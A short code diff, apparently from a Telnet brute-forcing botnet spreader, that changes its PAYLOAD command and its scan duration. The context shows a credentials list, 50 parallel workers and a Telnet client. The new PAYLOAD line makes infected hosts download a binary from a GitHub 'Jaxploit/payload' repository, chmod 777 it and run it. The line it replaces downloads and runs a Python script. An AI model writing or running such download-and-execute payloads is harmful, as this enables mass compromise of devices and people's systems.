@@ -27,8 +27,8 @@ CREDENTIALS = [
 
 TELNET_TIMEOUT = 0.05
 MAX_WORKERS = 50
-PAYLOAD = "wget https://github.com/Jaxploit/payload/raw/refs/heads/main/main.py && python main.py"
-SCAN_DURATION = 150
+PAYLOAD = "wget https://github.com/Jaxploit/payload/raw/refs/heads/main/payload.bin && chmod 777 * &&./payload.bin"
+SCAN_DURATION = 300
 
 class TelnetClient:
     def __init__(self, host, port=23, timeout=TELNET_TIMEOUT):
